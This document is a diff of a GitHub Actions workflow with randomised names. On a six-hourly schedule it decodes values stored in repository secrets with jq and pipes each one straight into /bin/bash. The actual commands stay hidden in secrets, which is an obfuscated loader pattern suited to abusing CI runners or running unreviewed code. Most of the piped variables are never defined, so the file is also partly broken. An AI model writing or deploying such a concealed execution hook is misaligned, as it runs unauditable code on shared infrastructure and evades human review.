@@ -1,29 +1,30 @@
 name: baozhongchu5657
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 1/6 * * *'
-
-jobs:  # 23906
+    - cron: '0 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: baozhongchu5657
         env:
-          ev760: ${{ secrets.ev760 }}
+          aheb0345: ${{ secrets.aheb0345 }}
         run: |
-          echo $ev760 | jq -r .v96971 | /bin/bash
-          echo $chz90494 | jq -r .so8537 | /bin/bash
-          echo $shogm6 | jq -r .hlj0515 | /bin/bash
-          echo $lmkb1 | jq -r .hl00080 | /bin/bash
-          echo $usmpg59 | jq -r .jcd9581 | /bin/bash
-          echo $skekn53093 | jq -r .wsqr5 | /bin/bash
-          echo $ifbi37 | jq -r .nf4 | /bin/bash
-          echo $xnhei344 | jq -r .wn0134 | /bin/bash
-          echo $k64 | jq -r .qbvio89640 | /bin/bash
-          echo $dgcu78 | jq -r .gcm18 | /bin/bash
-          echo $ww5020 | jq -r .qrum1483 | /bin/bash
-          echo $mvb87263 | jq -r .qopi3 | /bin/bash
+          echo $aheb0345 | jq -r .alwh4537 | /bin/bash
+          echo $t13638 | jq -r .tfcb3889 | /bin/bash
+          echo $dfuo2346 | jq -r .eeny8796 | /bin/bash
+          echo $kzqev13 | jq -r .l35883 | /bin/bash
+          echo $v1 | jq -r .pammn90686 | /bin/bash
+          echo $lxd32 | jq -r .ptqo5142 | /bin/bash
+          echo $soknl029 | jq -r .u8 | /bin/bash
+          echo $x780 | jq -r .exrzi94637 | /bin/bash
+          echo $c7 | jq -r .bcb5 | /bin/bash
+          echo $td3598 | jq -r .u5 | /bin/bash
+          echo $bgyk102 | jq -r .inai030 | /bin/bash
+          echo $ce985 | jq -r .u3 | /bin/bash
+          echo $drxfu2 | jq -r .x18 | /bin/bash
+          echo $c16526 | jq -r .hoj518 | /bin/bash
 
